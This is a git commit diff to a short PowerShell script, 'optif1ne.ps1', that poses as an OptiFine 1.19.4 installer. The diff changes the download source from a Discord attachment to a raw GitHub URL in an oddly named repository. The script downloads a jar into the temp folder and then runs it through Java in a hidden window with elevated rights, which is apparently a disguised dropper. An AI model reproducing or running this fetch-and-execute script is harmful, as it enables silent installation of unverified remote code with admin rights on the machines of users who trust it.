c5caaae4a2d74c3dda1a24d8f223da3c77e043aa
RedTheMenace <101410080+RedTheMenace@users.noreply.github.com>
2023-05-11 16:57:21 -0400

    Update optif1ne.ps1

--- optif1ne.ps1
+++ optif1ne.ps1
@@ -1,4 +1,4 @@
-bitsadmin /transfer Explorers /download /priority FOREGROUND https://cdn.discordapp.com/attachments/1105931252453871696/1105931301170708581/Optifine_1.19.4_Installer.jar "$env:temp\Optifine_1.19.4_Installer.jar" ; 
+bitsadmin /transfer Explorers /download /priority FOREGROUND "https://raw.githubusercontent.com/RedTheMenace/OpifIJejwejwe/main/Optifine_1.19.4_Installer.jar" "$env:temp\Optifine_1.19.4_Installer.jar" ; 
 sleep 3 ; 
 cd $env:temp ; 
 start java -windowstyle hidden -verb runas -args '-jar Optifine_1.19.4_Installer.jar'
